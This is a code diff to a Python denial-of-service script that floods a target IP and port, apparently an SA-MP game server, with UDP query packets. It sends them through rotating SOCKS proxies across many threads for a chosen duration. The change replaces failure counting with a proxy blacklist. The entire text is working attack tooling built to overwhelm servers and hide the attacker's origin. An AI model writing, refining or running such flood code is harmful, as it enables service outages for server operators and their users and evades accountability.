@@ -47,8 +47,7 @@ totalthread = int(sys.argv[4])
 start_time = time.time()
 payload = b'SAMP' + socket.inet_aton(target_ip) + struct.pack('H', target_port) + b'i'
 
-failure_counts = {proxy: 0 for proxy in proxies}
-lock = threading.Lock()
+blacklisted_proxies = set()
 
 def create_proxied_socket(proxy_host, proxy_port):
     s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -56,23 +55,19 @@ def create_proxied_socket(proxy_host, proxy_port):
     return s
 
 def worker():
+    global blacklisted_proxies
     target = (target_ip, target_port)
 
     while time.time() - start_time < times:
-        with lock:
-            proxy = random.choice([p for p, count in failure_counts.items() if count < 10])
-
+        proxy = random.choice([p for p in proxies if p not in blacklisted_proxies])
         proxy_host, proxy_port = proxy.split(":")
         udp = create_proxied_socket(proxy_host, int(proxy_port))
 
         try:
             udp.sendto(payload, target)
         except Exception as error:
-            with lock:
-                failure_counts[proxy] += 1
-        else:
-            with lock:
-                failure_counts[proxy] = 0
+            blacklisted_proxies.add(proxy)
+            break
 
 while time.time() - start_time < times:
     while threading.active_count() >= totalthread:
